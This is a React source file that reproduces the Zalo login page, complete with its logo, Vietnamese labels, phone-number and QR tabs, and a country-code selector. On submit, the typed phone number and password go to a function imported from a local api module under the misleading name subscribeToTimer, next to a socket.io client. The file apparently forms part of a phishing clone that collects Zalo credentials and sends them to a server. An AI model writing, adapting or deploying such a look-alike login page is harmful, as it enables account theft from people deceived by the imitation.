import React, { Component } from 'react';
import logo from './iconzalo.jpg';
import QR from './qrcode.png';
import { library } from '@fortawesome/fontawesome-svg-core';
import 'bootstrap/dist/css/bootstrap.min.css'
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faIgloo } from '@fortawesome/free-solid-svg-icons';
import { fas } from '@fortawesome/free-solid-svg-icons';
import { faFacebookF } from '@fortawesome/free-brands-svg-icons';
import { Tabs } from 'antd';
import { subscribeToTimer } from './api';
import { Tooltip } from 'antd';
import openSocket from 'socket.io-client';
import 'antd/dist/antd.css';
import { Modal, Button } from 'antd';
import DatePicker from 'antd/lib/date-picker';
import 'antd/lib/date-picker/style/css';
import { Select } from 'antd';
import { LocaleProvider } from 'antd';
import frER from 'antd/lib/locale-provider/fr_FR';
import moment from 'moment';
import 'moment/locale/fr';
import './App.css';

moment.locale('fr');

const TabPane = Tabs.TabPane;
const Option = Select.Option;


function handleChange(value) {
	console.log(`selected ${value}`);
}

function handleBlur() {
	console.log('blur');
}

function handleFocus() {
	console.log('focus');
}

function callback(key) {
	console.log(key);
}

function FormError(props) {
	if (props.isHidden) {return null;}
	return (
	  <div className="form-warning">
		  {props.errorMessage}
	  </div>
	)
  }
  const validateInput = (checkingText) => {
    
    const regexp = /^\d{10,11}$/; 
    // regular expression - checking if phone number contains only 10 - 11 numbers
    
    if (regexp.exec(checkingText) !== null) {
            return {
                isInputValid: true,
                errorMessage: ''
            };
        } else {
            return {
                isInputValid: false,
                errorMessage: 'Số điện thoại phải có 10 - 11 chữ số.'
            };
        }
}



library.add(faFacebookF);
library.add(faIgloo);
library.add(fas);




class App extends Component {
	constructor(props) {
		super(props);
		this.state = {
			username: '',
			password: '',
      		isInputValid: true,
			errorMessage: '',
			addClass: false
		  };
		  this.handleChange = this.handleChange.bind(this);
		  this.handleChangePassword = this.handleChangePassword.bind(this);
		  this.handleSubmit = this.handleSubmit.bind(this);

		  
	
	  }
	
	  handleInputValidation = event => {
		const { isInputValid, errorMessage } = validateInput(this.state.username);
		this.setState({
		  isInputValid: isInputValid,
		  errorMessage: errorMessage
		})
		
	  }

	  handleChange(event) {
		this.setState({username: event.target.value});
	  }
	  handleChangePassword(event){
		  this.setState({password: event.target.value});
	  }

	  handleSubmit(event) {
		subscribeToTimer({username: this.state.username, password: this.state.password});
		event.preventDefault();
	  }

	render() {
		const { visible, loading } = this.state;
		return (

			<div className="App" class="wrapper-page has-mobile">
				<div class="wrapper-page is-only-desktop">
					<div class="zLogin-layout parentDisable">
						<div class="header">
							<img src={logo} className="App-logo" alt="logo" />
							<h2 class="hide-on-med-and-down">Đăng nhập bằng tài khoản Zalo</h2>
						</div>
						<div class="body">
							<div>
								<div class="body-container">
									< Tabs defaultActiveKey="1" onChange={callback}>
										< TabPane tab="VỚI SỐ ĐIỆN THOẠI" key="1">
											<div class="form-signin">
												<div>

													<div>
													
														<div class="line-form has-ico has-flag">
															<div>
																<FontAwesomeIcon icon="mobile-alt" />
																<div class="select-flag">
																	<Select
																		showSearch
																		defaultValue="+84"
																		style={{ width: 80 }}
															
																		optionFilterProp="children"
																		onChange={handleChange}
																		onFocus={handleFocus}
																		onBlur={handleBlur}
																		filterOption={(input, option) => option.props.children.toLowerCase().indexOf(input.toLowerCase()) >= 0}
																	>
																		<Option value="vietnam">
																			<Tooltip placement="right" title="Vietnam">
																				<span>+84</span>
																			</Tooltip>
																		</Option>
																		<Option value="taiwan">	<Tooltip placement="right" title="Taiwan">
																			<span>+886</span>
																		</Tooltip></Option>
																		<Option value="canada">	<Tooltip placement="right" title="Canada">
																			<span>+1</span>
																		</Tooltip></Option>
																	</Select>

																</div>
																<input tabindex="1" type="tel" name="phone_num" autocomplete="off" placeholder="Số điện thoại" class="input" value={this.state.username} onChange={this.handleChange} onBlur={this.handleInputValidation} required />
																<FormError 
              isHidden={this.state.isInputValid} 
              errorMessage={this.state.errorMessage} />
																
															</div>

														</div>
													
														<div class="line-form has-ico">
															<FontAwesomeIcon icon="lock" />
															<input tabindex="2" type="password" placeholder="Mật khẩu" autocomplete="off" value={this.state.password} onChange={this.handleChangePassword}  ></input>
														</div>
														<div class="space" id="test"></div>
														<div class="textAlign-center has-2btn">
														<button onClick={this.handleSubmit}>
															<a tabindex="4" class="btn btn--m block first disabled">Đăng nhập với mật khẩu</a>

															</button>
															<div class="btn-wrap-more">
																<a class="btn btn-default btn-rq btn--m disabled" href="#!">Gửi yêu cầu đăng nhập</a>
																<div class="space">
																</div>
																<div class="login-or">
																
																	<Button type="primary" onClick={this.handleClickforget}>
																	<a>Quên mật khẩu?</a>
																	</Button>										
																	<span class="help-text">Hoặc đăng nhập bằng</span>
																	<div class="iconfb">
																		<FontAwesomeIcon icon={['fab', 'facebook-f']} />
																	</div>
																</div>
															</div>

														</div>
													</div>
												</div>
											</div>
										</TabPane>
										<TabPane tab="VỚI MÃ QR" key="2">
											<div class="form-signin">
												<div class="in-tableCell">
													<div>
														<div class="qrcode disabled">
															<img src={QR} className="QR Code" alt="QR Code" />

															<div class="qrcode-expired">
																<p>Mã QR hết hạn</p>
																<a tabindex="0" class="btn btn--s">Lấy mã mới</a>
															</div>
														</div>
														<p class="textAlign-center otr-2">Quét mã QR bằng Zalo để đăng nhập</p>
													</div>
												</div>
											</div>

										</TabPane>
									</Tabs>
								</div>

								<div class="dk-1">
									<div class="dk-2">
										<p class="action-more">Bạn chưa có tài khoản?</p>
									</div>
									<div class="dk-3">
										<a>Đăng ký ngay!</a>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		);
	}

}
export default App;



